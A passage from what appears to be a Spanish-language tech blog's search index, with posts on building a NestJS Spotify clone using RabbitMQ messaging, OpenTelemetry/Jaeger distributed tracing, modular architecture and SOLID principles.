urls: [ amqp ], queue: QUEUE_NAME, queueOptions: { durable: false, }, }, } }, inject: [ ConfigService ] } ]), ], exports: [ RabbitmqClient, ], providers: [ RabbitmqClient ]})export class RabbitmqQueueModule { static getMicroserviceOptions(){ // ... more code }}Este código creará un cliente de RabbitMQ que podremos utilizar en nuestros microservicios. Sin embargo, iremos un paso más allá y crearemos un servicio más personalizado para evitar estar acoplados a la librería de NestJS.Definiremos la estructura general de nuestros mensajes que serán enviados entre nuestros microservicios de Spotify-Clone.export interface RabbitmqMessage&lt;T&gt; { id: string; pattern: string; timestamp: Date; data: T;}// Definimos los mensajes que se enviarán entre microserviciosexport interface NewAlbumDataMessage { albumId: string; title: string;}export type NewAlbumMessage = RabbitmqMessage&lt;NewAlbumDataMessage&gt;Y definimos ahora un servicio que será encargado de enviar mensajes.@Injectable()export class RabbitmqClient { constructor(@Inject(RABBITMQ_PRODUCER_CLIENT) private client: ClientProxy) { } emitTo&lt;T&gt;(pattern: string, data: T): RabbitmqMessage&lt;T&gt; { const message: RabbitmqMessage&lt;T&gt; = { id: uuidv4(), pattern: pattern, timestamp: new Date(), data: data } this.client.emit(pattern, message) return message }}Y para usar nuestro cliente en alguna aplicación de NestJS, importamos el módulo RabbitMQModule.@Module({ imports: [ RabbitmqQueueModule, // other imports ], // other modules})export class MusicLibraryModule {}Y usamos el servicio donde queramos enviar mensajes.@Injectable()export class AlbumService { constructor( @InjectRepository(Album) private albumRepository: Repository&lt;Album&gt;, @InjectRepository(Artist) private artistRepository: Repository&lt;Artist&gt;, private rabbitmqClient: RabbitmqClient, ) { } async save(album: CreateAlbumRequest) { const artist = await this.artistRepository.findOneBy({ id: album.artistId }) const albumCreated = await this.albumRepository.save({ title: album.title, photo: album.photo, artist: artist, year: album.year, }) this.rabbitmqClient.emitTo&lt;NewAlbumDataMessage&gt;('new-album', { albumId: albumCreated.id, title: albumCreated.title }) return albumCreated }}Ahora, el servicio de álbum, al crear un álbum, enviará un mensaje a RabbitMQ. Todos los clientes que se suscriban a la cola recibirán el mensaje y podrán realizar las operaciones pertinentes.Este enfoque nos trae los siguientes beneficios: Desacoplamos la lógica de un caso de uso (crear álbum) de lógicas de notificaciones (email). El sistema queda extensible a otros casos de uso de forma desacoplada del principal. Hemos agregado escalabilidad a nuestro ecosistema de microservicios.Si bien este es un ejemplo básico, existen múltiples configuraciones en arquitecturas orientadas a comunicaciones asíncronas.El ejemplo completo está disponible levantando los siguientes servicios:#!/bin/bash# up infrastructure with docker-composenpm run start:infra# start music-library microservicenpm run start:music-library# start mailing microservicenpm run start:mailingConclusiónLa comunicación entre microservicios de forma sincrónica nos dará la versatilidad de crear aplicaciones con responsabilidades únicas. Cada uno de estos componentes podrá comunicarse con otros de forma sencilla cuando la comunicación de estos no involucra temas de latencia y de responsabilidad. En este caso nos convendrá utilizar una comunicación asíncrona, la cual nos dará la posibilidad de crear sistemas escalables y de alto rendimiento. Cada enfoque debe ser adecuado al caso, pero básicamente estas 2 formas de comunicación las encontrarás implementadas de múltiples maneras en arquitecturas basadas en microservicios.Github repository" }, { "title": "Microservicios 2 Observabilidad en NestJs, un ejemplo práctico de trazas distribuidas", "url": "/posts/microservicios-observabilidad-en-microservicios-un-ejemplo-practico-de-trazas-distribuidas/", "categories": "Microservicios,Observabilidad,OpenTelemetry,Jeager,Trazas, distribuidas", "tags": "microservicios,observabilidad,opentelemetry,jeager,trazas, distribuidas", "date": "2023-11-28 02:00:00 -0300", "snippet": "IntroducciónEn el mundo de los microservicios, la observabilidad es un aspecto crucial para entender el comportamiento y el rendimiento de nuestras aplicaciones. La observabilidad nos permite recopilar y analizar datos de diferentes fuentes para obtener una visión completa de nuestras aplicaciones. Este enfoque holístico no solo nos proporciona una visión exhaustiva de cada componente de nuestras aplicaciones, sino que también nos permite identificar patrones, anomalías y optimizaciones potenciales, contribuyendo así a fortalecer la robustez y eficiencia de nuestras soluciones tecnológicas.En este artículo abordaremos cómo implementar trazas distribuidas sobre el flujo de 2 aplicaciones en un entorno de microservicios utilizando OpenTelemetry y JagerUI sobre un sistema de microservicios que emula la plataforma de Spotify. Todo con NestJs 😉.Las bases de la observabilidadCuando nos adentramos en el mundo de la observabilidad, escucharemos muy a menudo el concepto de MELT, el cual es un acrónimo que se refiere a los cuatro pilares de la observabilidad: Métricas, Eventos, Logs y Trazas. Métricas: son datos numéricos que representan el estado de nuestra aplicación en un momento dado. Eventos: son registros de acciones o cambios significativos en nuestra aplicación. Logs: son registros detallados de las actividades de nuestra aplicación. Trazas: son representaciones visuales de cómo las solicitudes fluyen a través de nuestra aplicación.Visualmente nos puede quedar más claro con la siguiente imagen:La importancia de las trazas en sistemas distribuidosLas trazas en una aplicación distribuida son fundamentales porque ofrecen una ventana detallada hacia el flujo de datos y acciones entre sus distintos componentes. Estas trazas permiten seguir el camino de una solicitud o proceso a través de los diversos servicios, facilitando la detección de problemas, la depuración de errores, la optimización del rendimiento y la comprensión holística de la interacción entre los elementos distribuidos.¿Qué es OpenTelemetry?OpenTelemetry es un conjunto de APIs, bibliotecas y agentes que permiten la recopilación y gestión de telemetría (métricas, logs, trazas) de nuestras aplicaciones. OpenTelemetry es un proyecto de la Cloud Native Computing Foundation (CNCF) y es compatible con una amplia gama de marcos y lenguajes de programación.Para el envío de trazas, logs o métricas, las aplicaciones deben instrumentarse. Este trabajo es realizado por las librerías de OpenTelemetry.OpenTelemetry no solo soporta la instrumentación de aplicaciones, sino que también podremos instrumentar infraestructura para entender un poco más en detalle cómo funciona la instrumentación. Veamos la siguiente imagen:OTel Collector es la pieza de software que recopila datos de telemetría de las aplicaciones y servicios instrumentados. Los datos de telemetría se recopilan en un formato estándar llamado OpenTelemetry Protocol (OTLP). El collector luego puede procesar los datos de telemetría y exportarlos a una variedad de destinos, como bases de datos, sistemas de análisis y paneles de control.¿Qué es Jeager UI?Jaeger es una herramienta de trazado distribuido que permite visualizar y analizar las trazas de nuestras aplicaciones. Con Jaeger, podemos ver cómo las solicitudes fluyen a través de nuestros microservicios y dónde se producen los cuellos de botella o los errores. Algunas de sus características incluyen: Propagación de contexto distribuida Monitoreo de transacciones distribuidas Análisis de raíz de la causa Análisis de dependencia del servicio Optimización de rendimiento/latenciaUtilizaremos el componente Jeager UI, el cual nos permitirá visualizar las trazas enviadas por aplicaciones que instrumentemos con OpenTelemetry.Instrumentando aplicaciones con OpenTelemetryPara instrumentar nuestros microservicios con OpenTelemetry, necesitamos inicializar el SDK de OpenTelemetry y configurarlo para recopilar métricas, logs y trazas. A continuación, se muestra un ejemplo de cómo podemos hacer esto en TypeScript.Instalación. OpenTelemetry tiene un montón de dependencias que deberemos incluir dependiendo de nuestro caso, pero básicamente instalamos los componentes base de telemetría y sdk-node e instrumentaciones específicas de tecnologías que queremos hacer tracing.npm install @opentelemetry/context-async-hooks \\ @opentelemetry/exporter-metrics-otlp-proto \\ @opentelemetry/exporter-trace-otlp-http \\ @opentelemetry/instrumentation-amqplib \\ @opentelemetry/instrumentation-express \\ @opentelemetry/instrumentation-http \\ @opentelemetry/instrumentation-pg \\ @opentelemetry/resources \\ @opentelemetry/sdk-metrics \\ @opentelemetry/sdk-node \\ @opentelemetry/sdk-trace-node \\ @opentelemetry/semantic-conventionsLa siguiente función implementa la instrumentación básica de una aplicación Node.js. Esta función recolectará toda la información de métricas y trazas y las enviará a un servidor OTLP con el cual podremos visualizar los datos de forma gráfica.import { Logger } from \"@nestjs/common\";import { metrics } from '@opentelemetry/api';import { AsyncLocalStorageContextManager } from \"@opentelemetry/context-async-hooks\";import { OTLPMetricExporter } from \"@opentelemetry/exporter-metrics-otlp-proto\";import { OTLPTraceExporter } from \"@opentelemetry/exporter-trace-otlp-http\";import { InstrumentationOption } from '@opentelemetry/instrumentation';import { Resource } from \"@opentelemetry/resources\";import { MeterProvider, PeriodicExportingMetricReader } from \"@opentelemetry/sdk-metrics\";import { NodeSDK } from \"@opentelemetry/sdk-node\";import { SemanticResourceAttributes } from \"@opentelemetry/semantic-conventions\";// Tipo de opciones para crear el SDKtype CreateSdkOptions = { serviceName: string // nombre del servicio el cual poderemos identificar serviceVersion: string, traceExporterOptions?: { url: string, headers?: any }, metricExporterOptions?: { url: string, headers?: any }, instrumentations?: InstrumentationOption[] // implementaciones por defecto que realizan la isntrumentacion de ciertas librerias sin necesidad de hacerlo por nosotros.}// Función para crear el SDK de OpenTelemetryexport function createSdk(options: CreateSdkOptions) { // Crea un recurso con información del servicio el cual puede ser identificado en el servico de telemetria que escojamos const resource = new Resource({ [SemanticResourceAttributes.SERVICE_NAME]: options.serviceName, [SemanticResourceAttributes.SERVICE_VERSION]: options.serviceVersion, [SemanticResourceAttributes.SERVICE_NAMESPACE]: 'local-machine.spotify-clone' }) // Crea exportadores para trazas y métricas const traceExporter = new OTLPTraceExporter(options.traceExporterOptions); const metricExporter = new OTLPMetricExporter(options.metricExporterOptions) // Inicializa el SDK de OpenTelemetry para Node.js const sdk = new NodeSDK({ resource, traceExporter, contextManager: new AsyncLocalStorageContextManager(), instrumentations: options.instrumentations as any }); // Configura un lector de métricas para exportación periódica const metricReader = new PeriodicExportingMetricReader({ exporter: metricExporter, exportIntervalMillis: 30000, // Default is 60000ms (60 seconds). Set to 3 seconds for demonstrative purposes only. }); // Crea un proveedor de medidores para la aplicación const applicationMeterProvider = new MeterProvider({ resource: resource, }); // Asigna el lector de métricas al proveedor de medidores de la aplicación applicationMeterProvider.addMetricReader(metricReader); // Establece este proveedor como el proveedor global de medidores para la aplicación metrics.setGlobalMeterProvider(applicationMeterProvider); return sdk // Retorna el SDK configurado}// Función para iniciar OpenTelemetryexport function startOpenTelemetry(options: CreateSdkOptions) { // Crea el SDK de OpenTelemetry llamando a la función createSdk con opciones adicionales const sdk = createSdk({ ...options, metricExporterOptions: { url: process.env.OTLP_TRACE_EXPORTER_URL,// URL para la exportación de métricas }, }) // Función para detener adecuadamente el SDK de OpenTelemetry const shutdownOtelSdk = () =&gt; { sdk .shutdown() .then(() =&gt; { Logger.log(\"OTEL SDK shut down successfully\", \"OpenTelemetrySdk\") process.exit(0) }) .catch(() =&gt; { Logger.log(\"OTEL SDK failed shut down\", \"OpenTelemetrySdk\") process.exit(1) }) } // Manejadores para las señales SIGTERM y SIGINT que llaman a la función de cierre process.on(\"SIGTERM\", () =&gt; shutdownOtelSdk()) process.on(\"SIGINT\", () =&gt; shutdownOtelSdk()) // Inicia el SDK de OpenTelemetry sdk.start() Logger.log(\"OTEL SDK started successfully\", \"startTelemetry\")}Ejemplo de trazas con una comunicación entre microserviciosPara ilustrar cómo podemos utilizar OpenTelemetry para mejorar la observabilidad de nuestros microservicios, vamos a utilizar un ejemplo de un clon de Spotify. Tenemos las siguientes aplicaciones: mobile-bff: Backend for frontend para aplicaciones móviles, expone los datos mediante GraphQL. music-library-ms: API Rest con la data de artistas, álbumes y canciones.Es un proceso básico que ilustrará una petición de un servicio a otro.El código que se mostrará a continuación define la estructura básica y simplificada de las aplicaciones mobile-bff y music-library-ms, las cuales simularán la librería musical de Spotify. Si quieres ver en detalle el codigo puedes consultar el repositorioServicio MobileBFF Spotify cloneDefinimos las clases necesarias para levantar nuestro servicio GraphQL.// Model de Artist Graphql@ObjectType()export class Artist { @Field({ nullable: true }) id: string; @Field() name: string; @Field({ nullable: true }) photo?: string; @Field({ nullable: true }) biography?: string; @Field(type =&gt;[Album], { nullable: 'itemsAndList' }) albums?: Album[]}// Resolver de Artist@Resolver(of =&gt; Artist)export class ArtistResolver { constructor( private artistService: ArtistService, private albumService: AlbumService ) {} @Span(\"ArtistResolver/query/artistById\") @Query(returns =&gt; Artist) artistById(@Args('id') id: string) { return this.artistService.findById(id) } @Span(\"ArtistResolver/query/artists\") @Query(returns =&gt; [Artist]) artists() { return this.artistService.findAll() } @Span(\"ArtistResolver/field/album\") @ResolveField() async albums(@Parent() artist: Artist) { return this.albumService.findByArtistId(artist.id) }}// cliente http para conexion con el microservicio music-library-ms@Injectable()export class MusicLibraryCLient { private musiclibraryUrl = null constructor( private readonly http: HttpService, private readonly config: ConfigService ) { this.musiclibraryUrl = this.config.get(\"MOBILE_BFF_MUSIC_LIBRARY_API\") } @Span(\"MusicLibraryHttpClient/GET\") get&lt;T = any&gt;(endopoint: string, config?: AxiosRequestConfig): Observable&lt;T&gt; { const url = `${this.musiclibraryUrl}/${endopoint}` return this.http.get(url, config).pipe( map(res =&gt; res.data) ); }}// componente de tipo service para obtener los artistas de music-library-ms@Injectable()export class ArtistService { constructor(private client: MusicLibraryCLient) { } @Span(\"ArtistService/findById\") findById(id: string): Observable&lt;ArtistModel[]&gt; { return this.client.get(`artists/${id}`) } @Span(\"ArtistService/findAll\") findAll() { return this.client.get(`artists`) }} Se ignoran las configuraciones de módulos, ya que salen del objetivo del artículo.Microservicio Music Library Spotify CloneNuestro Microservicio music-library-ms es una API Rest simple.// artist controller@Controller('artists')@ApiTags('Artists')export class ArtistController { constructor(private artistService: ArtistService) { } @Get() @ApiOperation({ summary: 'Get all artists' }) @ApiResponse({ status: 200, description: 'All artists', type: [ArtistModel] }) async getAllArtists(): Promise&lt;ArtistModel[]&gt; { return await this.artistService.findAll(); } @Get(':id') @ApiOperation({ summary: 'Get an artist by ID' }) @ApiParam({ name: 'id', description: 'The ID of the artist' }) @ApiResponse({ status: 200, description: 'The artist', type: ArtistModel }) @ApiResponse({ status: 404, description: 'Artist not found' }) async getArtist(@Param('id') id: string): Promise&lt;ArtistModel | undefined&gt; { return await this.artistService.findById(id); }}// artist modelexport class ArtistModel { @IsUUI() @IsNotEmpty() @ApiProperty({ description: 'The ID of the artist' }) id: string; @IsString() @ApiProperty({ description: 'The name of the artist' }) name: string; @IsString() @ApiProperty({ description: 'The photo of the artist' }) photo: string; @IsString() @ApiProperty({ description: 'The biography of the artist' }) biography: string;}// ArtistService@Injectable()export class ArtistService { constructor(@InjectRepository(Artist) private repository: Repository&lt;Artist&gt;) { } @Span(\"ArtistService/findAll\") findAll(): Promise&lt;ArtistModel[]&gt; { return this.repository.find(); } @Span(\"ArtistService/findById\") @NotFoundExceptionIfUndefined('Artist not found') findById(id: string): Promise&lt;ArtistModel&gt; { return this.repository.findOneBy({ id }); }}// Artist ORM Entity@Entity()export class Artist { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() name: string; @Column() photo: string; @Column() biography: string; @OneToMany(() =&gt; Song, song =&gt; song.artist) songs: Song[] @OneToMany(() =&gt; Album, album =&gt; album.artist) albums: Album[]}Iniciando instrumentación de microserviciosLa instrumentación debe instanciarse en el punto de entrada de la aplicación. Debemos hacer llamado de la función startOpenTelemetry() en la ejecución del archivo main.ts. Debemos iniciar esta función antes del método bootstrap() como en el siguiente ejemplo:mobile-bff apps/mobile-bff/main.ts// MOBILE-BFF Applicationasync function bootstrap() { const app = await NestFactory.create(MusicLibraryMsModule); // server implementation and more code...}startOpenTelemetry({ serviceName: \"mobile-bff\", serviceVersion: \"1.0\", instrumentations: [ new HttpInstrumentation(), // trazas http new ExpressInstrumentation({ // trazas express ignoreLayersType: [ExpressLayerType.REQUEST_HANDLER, ExpressLayerType.MIDDLEWARE] // se ignora trazas provenientes de middleware y request handlre de express }), ],})bootstrap();music-library-ms apps/music-library-ms/main.ts// MusicLibraryMS microserviceasync function bootstrap() { const app = await NestFactory.create(MusicLibraryMsModule); // server implementation and more code...}startOpenTelemetry({ serviceName: \"music-library-ms\", serviceVersion: \"1.0\", instrumentations: [ new HttpInstrumentation(), new PgInstrumentation(), // trazas de postgres new ExpressInstrumentation({ ignoreLayersType: [ExpressLayerType.REQUEST_HANDLER, ExpressLayerType.MIDDLEWARE] }), ],})bootstrap();Tanto mobile-bff como music-library-ms instrumentarán HttpInstrumentation y ExpressInstrumentation. Con esto lograremos que OpenTelemetry pueda asociar cualquier petición entre los 2 en una misma traza con una jerarquía incluida. music-library-ms instrumentará PgInstrumentation para obtener información sobre el motor PostgreSQL.Customizando Trazas con SpansUn “Span” representa una porción de tiempo durante la cual una operación específica ocurre en una aplicación. Por ejemplo, cuando se inicia una solicitud HTTP en un servicio y se completa, también contienen información relevante sobre el tiempo que tomó la operación, metadatos contextualizados (como identificadores de servicio, identificadores de usuario, etc.), así como también pueden tener relaciones padre-hijo, lo que permite visualizar cómo las operaciones se relacionan entre sí en un entorno distribuido.Para implementar Span podemos utilizar la librería nestjs-otel, la cual nos proporciona un conjunto de anotaciones y servicios de NestJS para instrumentar de forma fácil y limpia nuestras aplicaciones.npm install nestjs-otelAhora en cualquier método podemos hacer uso del decorador @Span.@Span(\"ArtistService/findById\")findById(id: string): Promise&lt;ArtistModel&gt; { return this.repository.findOneBy({ id });}Además, podemos agregar atributos a nuestras trazas para proporcionar más contexto sobre las operaciones que estamos rastreando. Por ejemplo, podemos agregar más información o metadata a nestras trazas en ArtistService de la siguiente manera:@Injectable()export class ArtistService { constructor(private readonly traceService: TraceService) {} // atributos mediante decorador @Span(\"ArtistService/findById\", { attributes: { foo: 'bar' }}) findById(id: string): Promise&lt;ArtistModel&gt; { return this.repository.findOneBy({ id }); } // atributos mediante service async save(artist: CreateArtistRequest) { const currentSpan = this.traceService.getSpan(); // --&gt; retrives current span, comes from http or @Span const saved = await this.repository.save(artist) await this.doSomething(); currentSpan.addEvent('event 1'); currentSpan.end(); // current span end const span = this.traceService.startSpan('sub_span'); // start new span span.setAttributes({ userId: 1 }); await this.doSomethingElse(); span.end(); return saved } async doSomething() { // some random operation }}Ejecución y Pruebas de trazas distribuidasFinalizando con la implementación de OpenTelemetry, es hora de realizar un par de pruebas. Todo el código anterior con mayor detalle está en el siguiente repositorio. Ahora sigue los siguientes pasos para probar el sistema: Necesitarás tener Docker corriendo en tu máquina local.# Clonar el repositoriogit clone https://github.com/nullpointer-excelsior/microservices-architecture-nestjs# Instalar dependenciascd microservices-architecture-nestjs/npm installAhora necesitaremos levantar la infraestructura y las aplicaciones:# Levantar infraestructuranpm run start:infra # Iniciar mobile-bffnpm run start:mobile-bff# Iniciar music-library-msnpm run start:music-libraryEl comando npm run start:infra levantará también a Jeager UI. Ahora, si todo sale bien, tendrás 2 aplicaciones NestJs ejecutándose más la aplicación Jeager UI: mobile-bff: En la URL http://localhost:3014/graphql encontrarás el playground de GraphQL con el cual podrás ejecutar consultas. music-library-ms: En la URL http://localhost:3011/api encontrarás la definición de la API con Swagger con la que podrás interactuar con la API directamente. Jeager UI: En la URL http://localhost:16686 encontrarás Jaeger UI. Aquí es donde visualizaremos las trazas de las aplicaciones.Visualizando nuestra primera trazaNos dirigimos a http://localhost:3014/graphql y realizaremos la siguiente query.query { artists { name, albums { photo, songs { title, } } }}como se muestra en la imagen En este caso, no nos devolverá datos, pero habrá hecho una petición a music-library-ms, con esto nos basta.Visualizando trazas en Jeager UINos dirigimos a http://localhost:16686 y en el buscador de servicios podremos filtrar nuestras trazas. En este caso, escogeremos mobile-bff. Si no vemos mobile-bff o music-library-ms, esperamos unos minutos y refrescamos.Ahora veremos las distintas trazas que llegaron a Jeager UI. Escogeremos la que tenga más spans asociados y expandiremos.Ahora podemos ver una jerarquía de spans realizados por ambas aplicaciones donde nos da una apreciación de tiempo como de atributos que pudiera contener las trazas.Toda la información que enviamos es personalizable. Deberás consultar la documentación de OpenTelemetry o de la instrumentación en específico. Por ejemplo, aquí podemos visualizar la query realizada por music-library-ms.ConclusiónLa implementación de trazas distribuidas con OpenTelemetry nos dará una ventaja al momento de resolver problemas en entornos distribuidos. Antes de diseñar microservicios o cualquier aplicación donde el entorno producctivo sea realmente crítico, debemos considerar cómo vamos a hacer seguimiento de estos sistemas. En este artículo abordamos solo el caso de trazas, pero la observabilidad en la ingeniería de software nos ayudará a: Monitoreo de salud: Evaluar el estado de los componentes distribuidos. Identificar cuellos de botella: Encontrar áreas de rendimiento deficiente. Optimización de recursos: Ajustar asignación de CPU, memoria, etc. Seguimiento y trazabilidad: Rastrear flujo de datos entre servicios. Detección de problemas en tiempo real: Configurar alertas para responder rápidamente. Análisis de tendencias: Identificar patrones y comportamientos históricos de los usuarios para toma de decisiones. Automatización de respuestas: Tomar decisiones automáticas según la demanda. Optimización de la experiencia del usuario: Mejorar rendimiento según interacciones. Seguridad y detección de anomalías: Identificar posibles ataques o brechas. Evaluación del rendimiento a largo plazo: Analizar para mejorar la arquitectura.La observabilidad es un aspecto crucial para el desarrollo y la operación de microservicios. En este artículo vimos solo la capacidad de las trazas. OpenTelemetry nos proporciona las herramientas necesarias para recopilar y gestionar la telemetría de nuestras aplicaciones, lo que nos permite obtener una visión completa de nuestras aplicaciones. Con OpenTelemetry, podemos mejorar la calidad y el rendimiento de nuestras aplicaciones y resolver los problemas de manera más eficiente.Github repositoryMeme de cortesía:" }, { "title": "MicroServicios 1 Construyendo aplicaciones escalables y mantenibles", "url": "/posts/microservicios-1-construyendo-aplicaciones-escalables-y-mantenibles/", "categories": "Arquitectura, Software,, Domain, Driven, Design,, Microservicios,, NestJs,, Patrones,, Backend,, Fullstack,, Software, Engineer", "tags": "arquitectura, software,, domain, driven, design,, microservicios,, nestjs,, patrones,, backend,, fullstack,, software, engineer", "date": "2023-10-27 02:00:00 -0300", "snippet": "En este capítulo tomaremos nota de pequeños tips para generar aplicaciones escalables y mantenibles, las cuales podrán ayudarte de manera más sencilla en una posible transición de monolito a microservicios. No todos los sistemas en sus primeros pasos necesitan una arquitectura de microservicios, pero si puedes aplicar un poco de buenas prácticas te ahorrarás dolores de cabeza.Spotify clone con NestJs como prueba de conceptoCrearemos un clon de Spotify para ejemplificar. Con el siguiente diagrama de clases robado de internet modelaremos una API Restful con NestJs. Esta aplicación será una API backend.En base a esto crearemos nuestro backend, el cual será un simple CRUD en comienzo.El diseño de clases lo convertimos en un diseño de entidades de ORM.@Entity()export class Album { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() title: string; @Column() photo: string; @Column() year: number; @OneToMany(() =&gt; Song, song =&gt; song.album) songs: Song[]; @ManyToOne(() =&gt; Artist, artist =&gt; artist.albums) artist: Artist}@Entity()export class Artist { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() name: string; @Column() photo: string; @Column() biography: string; @OneToMany(() =&gt; Song, song =&gt; song.artist) songs: Song[] @OneToMany(() =&gt; Album, album =&gt; album.artist) albums: Album[]}@Entity()export class Genre { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() name: string; @OneToMany(() =&gt; Song, song =&gt; song.genre) songs: Song[];}@Entity()export class Playlist { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() name: string; @Column() duration: number; @ManyToMany(() =&gt; Song) @JoinTable() songs: Song[]; @ManyToOne(() =&gt; User, user =&gt; user.playlists) user: User;}@Entity()export class Radio { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() name: string; @ManyToMany(() =&gt; Song, (song) =&gt; song.radios) songs: Song[]; @ManyToOne(() =&gt; Genre, genre =&gt; genre.songs) genre: Genre}@Entity()export class Song { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() title: string; @Column() video: string; @Column() plays: number; @Column() duration: number; @ManyToOne(() =&gt; Album, album =&gt; album.songs) album: Album; @ManyToOne(() =&gt; Artist, artist =&gt; artist.songs) artist: Artist; @ManyToOne(() =&gt; Genre, genre =&gt; genre.songs) genre: Genre @ManyToMany(() =&gt; Radio, (radio) =&gt; radio.songs) @JoinTable() radios: Radio[]}@Entity()export class User { @PrimaryGeneratedColumn(\"uuid\") id: string; @Column() username: string; @Column() password: string; @Column() email: string; @Column() premium: boolean; @OneToMany(() =&gt; Playlist, playlist =&gt; playlist.user) playlists: Playlist[];}A partir de esta base construiremos un pequeño proyecto con buenas prácticas y tips.1 - Define tu aplicación de forma modularCrear tu aplicación de forma modular, separa los casos de uso relacionados en un contexto específico y define qué componentes serán compartidos por estos módulos para poder reutilizar código en común o funciones utilitarias. Sin embargo, estos deberían ser piezas de software pequeñas y extensibles. Si utilizamos funciones, tratemos de que sean lo más puras posibles y con sus test unitarios.Ejemplo: Módulos de Spotify clone: src├──  accounts├──  music-library├──  player└──  shared ├──  database └──  decoratorsDefinimos los módulos principales player, music-library y accounts. Estos tendrán agrupados sus casos de uso, servicios, repositorios, controladores y modelos de datos, mientras que el módulo shared contendrá los componentes compartidos por la aplicación. En este caso, el módulo database contiene las entidades ORM del modelo de datos de la aplicación. database├──  database.module.ts└──  entities ├──  album.entity.ts ├──  artist.entity.ts ├──  entity.base.ts ├──  genre.entity.ts ├──  playlist.entity.ts ├──  radio.entity.ts ├──  song.entity.ts └──  user.entity.tsAhora, con este enfoque, cada módulo puede implementar su propia arquitectura y diseño. En este ejemplo, el módulo library es solo un API CRUD para acceder a artistas, álbumes y canciones, por lo que las guías de diseño de NestJs nos bastan y sobran. En cambio, el módulo player puede tener mayor complejidad en ciertos casos de uso, por lo que podemos implementar una arquitectura hexagonal aislada en su propio módulo sin que otras partes de la aplicación se vean obligadas a implementarla.Ejemplo de CRUD: music-library├──  controller│ ├──  album.controller.ts│ ├──  artists.controller.ts│ ├──  genre.controller.ts│ └──  song.controller.ts├──  model│ ├──  album.model.ts│ ├──  artist.model.ts│ ├──  genre.model.ts│ └──  song.model.ts├──  music-library.module.ts└──  service ├──  album.service.ts ├──  artist.service.ts ├──  genre.service.ts └──  song.service.tsEjemplo Arquitectura Hexagonal: player├──  application│ ├──  playlists.use-cases.ts│ └──  radio.use-cases.ts├──  domain│ ├──  factory│ │ ├──  create-playlist-entity.ts│ │ └──  create-playlist-model.ts│ ├──  model│ │ ├──  genre.model.ts│ │ ├──  playlist.model.ts│ │ ├──  radio.model.ts│ │ ├──  song.model.ts│ │ └──  user.model.ts│ └──  service│ ├──  playlist.service.ts│ ├──  radio.service.ts│ ├──  song.service.ts│ └──  user.service.ts├──  infrastructure│ └──  restful-api│ ├──  controller│ │ ├──  playlist.controller.ts│ │ └──  radio.controller.ts│ └──  dto│ ├──  create-playlist.request.ts│ ├──  create-radio.request.ts│ └──  entity-created.response.ts└──  player.module.ts2 - Definir una comunicación entre módulos desacopladaAl definir una arquitectura modular, es muy probable que ciertos casos de uso nos obliguen a requerir algún servicio de otro módulo que no sea shared. Esto es propenso a crear código espagueti para establecer una comunicación desacoplada entre módulos. Podemos hacer uso de un event bus en memoria y aplicar una arquitectura orientada a eventos.NestJs nos provee un módulo de eventos el cual podemos hacer uso:npm i --save @nestjs/event-emitterCrearemos un pequeño ejemplo basado en la creación de una nueva Radio cuando un nuevo álbum es creado.Definimos una clase que representa el evento y lo agregamos a nuestro módulo shared.export class AlbumCreatedEvent {\tconstructor(public album: Album) {}}Ahora, cuando en el módulo music-library se hace un llamado al create() del servicio AlbumService, emitiremos el evento.@Injectable()export class AlbumService {\tconstructor(\t\t@InjectRepository(Album) private albumRepository: Repository&lt;Album&gt;,\t\t@InjectRepository(Song) private songRepository: Repository&lt;Song&gt;,\t\t@InjectRepository(Artist) private artistRepository: Repository&lt;Artist&gt;,\t\tprivate eventEmitter: EventEmitter2\t) { } \tasync create(request: CreateAlbumRequest) {\t\tconst songs = await this.songRepository.find({ where: { id: In(request.songIds)}})\t\tconst artist = await this.artistRepository.findOneBy({ id: request.artistId })\t\t\t\tconst albumCreated = await this.albumRepository.save({\t\t\ttitle: request.title,\t\t\tphoto: request.photo,\t\t\tartist: artist,\t\t\tyear: request.year,\t\t\tsongs\t\t})\t\t\t\tthis.eventEmitter.emit('library.album-created', new AlbumCreatedEvent(\t\t\talbumCreated\t\t))\t\t\t\treturn albumCreated\t}}Y ahora, en nuestro módulo player, escuchamos el evento.@Injectable()export class NewAlbumListener {\tconstructor(private radio: RadioUseCases) {}\t@OnEvent('library.album-created', { async: true })\tasync onNewAlbum(event: AlbumCreatedEvent) {\t\tawait this.radio.createLatestAmazingAlbumsRadio(event.album)\t}}Ahora, nuestros módulos quedan más aislados en responsabilidades, incluyendo la posibilidad de tener múltiples suscriptores a eventos.3 - Utilizar esquemas separados por cada módulo para bases de datos relacionalesEste enfoque nos permite una separación lógica y física de los datos más comprensible y nos permitiría una migración más limpia si un módulo lo queremos pasar a una aplicación independiente. En estos casos, diferentes esquemas para los datos también nos dan la flexibilidad.TypeORM nos permite hacer esto mediante anotaciones.@Entity({ schema: \"music_library\" })export class Song {\t// ...entity code}Ahora, cada esquema representará un módulo de nuestra aplicación. Los datos tendrán sus contextos definidos y aún así nos da la posibilidad de consultar los datos entre esquemas.4 - Conoce los principios SOLIDEstos 5 principios de diseño de software son aplicados a la programación orientada a objetos y es una excelente manera de crear código mantenible y escalable. Afortunadamente, muchos de estos principios son aplicados por frameworks como NestJs, Spring y muchos similares. Por lo que, si piensas que nunca los has aplicado, lo más probable es que te hayas topado sin darte cuenta. De todas formas, aquí un breve ejemplo de cada principio.Principio de responsabilidad única (SRP)Cada clase o módulo debe tener una sola responsabilidad. Por ejemplo, UserService solo tiene operaciones para manipular el modelo de User mediante Repository y el componente.@Injectable()export class UserService {\t// ...}Principio de abierto/cerrado (OCP)Este principio establece que las clases deben ser abiertas para la extensión, pero cerradas para la modificación. Por ejemplo, si no estás seguro de qué base de datos es la indicada en tu aplicación, puedes aplicar el patrón Entity Repository para desacoplar tu dominio del almacenamiento de datos definido. Este patrón también ayuda a un mejor testing unitario.// Repository contractexport interface SongRepository { findAll(): Promise&lt;Song&gt;; }// repository implementationexport class SongPostgresRepository implements SongRepository { findAll(): Promise&lt;Song&gt; { // code to implement a orm crud }}// NesJs provider declaration@Module({ providers: [ { provide: \"SONG_REPOSITORY\", useClass: SongPostgresRepository } ] })export PlayerModule {}// Repository injection@Injectable()export class SongUseCases { constructor(@Inject(\"SONG_REPOSITORY\") private songRepository: SongRepository) {}}NestJs no permite providers personalizados, así que en la definición, nuestra entidad es la representación de nuestros datos y su lógica asociada, y repository es el componente que realiza operaciones de escritura y 